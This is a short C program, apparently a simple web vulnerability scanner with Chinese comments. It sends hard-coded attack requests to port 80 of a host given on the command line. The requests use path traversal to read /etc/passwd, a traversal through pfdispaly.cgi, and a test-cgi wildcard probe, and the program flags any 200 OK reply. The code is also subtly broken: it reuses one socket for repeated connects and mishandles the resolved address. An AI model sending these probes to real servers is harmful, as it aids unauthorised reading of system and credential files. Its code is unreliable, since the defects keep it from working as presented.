#include <string.h>
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/types.h> 
#include <sys/param.h> 
#include <sys/ioctl.h> 
#include <sys/socket.h> 
#include <net/if.h> 
#include <netinet/in.h> 
#include <net/if_arp.h> 
#define BUFFSIZE 1024
/*定义要检测的漏洞数*/
#define MAXHOLE  3
int main(int argc,char *argv[]) 
{ 
	struct sockaddr_in address; 
	struct hostent *he = (struct hostent *)malloc( sizeof( struct hostent )); 
	int i; 
	int sockfd; 
	char buff[BUFFSIZE]; 
	char *fmt="HTTP/1.1 200 OK";
	/*定义了指针数组来存放漏洞*/
	char *hole[MAXHOLE]; 
	hole[0]="GET /../../../../etc/passwd HTTP/1.0\n\n"; 
	hole[1]="GET /cgi-bin/pfdispaly.cgi?/../../../../etc/motd HTTP/1.0\n\n"; 
	hole[2]="GET /cgi-bin/test-cgi?* HTTP/1.0\n\n"; 
	 
	if(argc!=2)
	{ 
		printf("Please input the IP address\n"); 
		return 0; 
	} 
	
	/*获得一个用于通信的套接字*/
	sockfd=socket(AF_INET,SOCK_STREAM,0); 
	address.sin_family=AF_INET; 
	address.sin_port=htons(80); 
	address.sin_addr.s_addr=inet_addr(argv[1]); 
	if ((he=gethostbyname(argv[1]))!=0) 
			//memcpy( (char *)&(address.sin_addr.s_addr) , he->h_addr,he->h_length); 
			address.sin_addr.s_addr=*((struct sockaddr_in *)(he->h_addr));
			
	if((address.sin_addr.s_addr=inet_addr(argv[1]))==-1) 
		return 0; 
	/*依次检测各个漏洞*/
	for (i=0;i<MAXHOLE;i++) 
	{ 
		if (connect(sockfd,(struct sockaddr*)&address,sizeof(address))==0)
		{ 
			send(sockfd,hole[i],strlen(hole[i]),0); 
			recv(sockfd,buff,sizeof(buff),0); 
			if(strstr(buff,fmt)!=NULL)
				printf("\nFound :%s\n", hole[i]);
		} 
	} 
	/*关闭套接字*/
	close(sockfd); 
	return 0; 
} 


